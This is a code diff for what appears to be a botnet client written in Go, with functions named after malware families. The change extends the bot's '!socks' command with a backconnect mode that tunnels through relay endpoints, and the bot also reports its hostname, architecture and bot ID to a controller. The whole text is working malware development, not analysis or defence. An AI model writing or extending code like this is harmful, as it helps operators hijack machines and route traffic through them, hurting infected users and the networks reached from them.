@@ -196,14 +196,45 @@ func blackEnergy(conn net.Conn, command string) error {
 		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
 		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
 	case "!socks":
-		if len(fields) < 2 {
-			return fmt.Errorf("usage: !socks <port>")
-		}
-		err := muddywater(fields[1], conn)
-		if err != nil {
-			conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
+		if len(fields) >= 2 {
+			arg := fields[1]
+			// If it's just a port number → direct listener mode (no relay)
+			if _, err := strconv.Atoi(arg); err == nil {
+				err := turmoil(arg, conn)
+				if err != nil {
+					conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
+				} else {
+					conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, "0.0.0.0:"+arg)))
+				}
+				return nil
+			}
+			// Otherwise it's relay address(es) — backconnect mode
+			var relays []string
+			for _, r := range strings.Split(arg, ",") {
+				r = strings.TrimSpace(r)
+				if r != "" {
+					relays = append(relays, r)
+				}
+			}
+			if len(relayEndpoints) > 0 {
+				relays = append(relays, relayEndpoints...)
+			}
+			err := muddywater(relays, conn)
+			if err != nil {
+				conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
+			} else {
+				conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, relays[0])))
+			}
+		} else if len(relayEndpoints) > 0 {
+			// No args — use pre-configured relay endpoints
+			err := muddywater(relayEndpoints, conn)
+			if err != nil {
+				conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
+			} else {
+				conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, relayEndpoints[0])))
+			}
 		} else {
-			conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, fields[1])))
+			return fmt.Errorf("usage: !socks <port> (direct) or !socks <relay:port> (backconnect)")
 		}
 	case "!stopsocks":
 		emotet()
